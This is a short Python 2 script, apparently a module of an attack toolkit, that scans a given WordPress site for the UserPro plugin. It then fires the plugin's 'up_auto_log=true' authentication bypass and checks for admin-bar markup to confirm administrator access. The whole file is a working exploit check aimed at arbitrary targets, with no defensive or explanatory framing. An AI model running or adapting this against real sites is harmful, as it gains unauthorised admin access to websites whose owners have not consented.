##
## wordpress user pro scanner
##

from core.misc import printf
from urllib2 import urlopen

def check_vuln(url):
   plug = "/wp-content/plugins/userpro/css/userpro.min.css"
   vuln = "/?up_auto_log=true"
   if 'http' not in url:
       try:
           urlopen('https://' + url)
           url = 'https://' + url
       except:
           url = 'http://' + url
   printf('[+] Check plugins (%s)' % url)
   pURL = urlopen(url + plug).read()
   if pURL.find(".userpro") > -1:
       printf('[+] Plugin is installed. checking vulnerable..')
       pURL = urlopen(url + vuln).read()
       if pURL.find("admin-bar-css") > -1 or urlopen(url + 'wp-admin').read().find('admin-bar-css') > -1:
           printf('[+] This website is vulnerable..')
       else:
           printf('[!] This website isn\'t vulnerable..')
   else:
       printf('[!] Plugin isn\'t installed')
